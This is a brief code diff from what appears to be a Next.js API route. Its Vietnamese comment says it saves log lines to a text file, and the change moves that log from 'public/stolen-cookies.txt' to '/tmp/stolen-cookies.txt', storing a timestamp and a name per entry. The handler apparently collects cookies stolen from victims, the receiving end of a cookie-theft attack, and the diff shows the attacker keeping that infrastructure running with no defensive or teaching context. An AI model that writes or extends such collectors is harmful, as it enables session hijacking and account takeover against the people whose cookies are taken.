@@ -24,7 +24,8 @@ export async function GET(req: NextRequest) {
 
   // Lưu log vào file txt trong thư mục project (dạng JSON lines)
   try {
-    const logPath = path.join(process.cwd(), "public/stolen-cookies.txt");
+    // const logPath = path.join(process.cwd(), "public/stolen-cookies.txt");
+    const logPath = path.join("/tmp", "stolen-cookies.txt");
     const line = JSON.stringify({
       time: new Date().toISOString(),
       name,
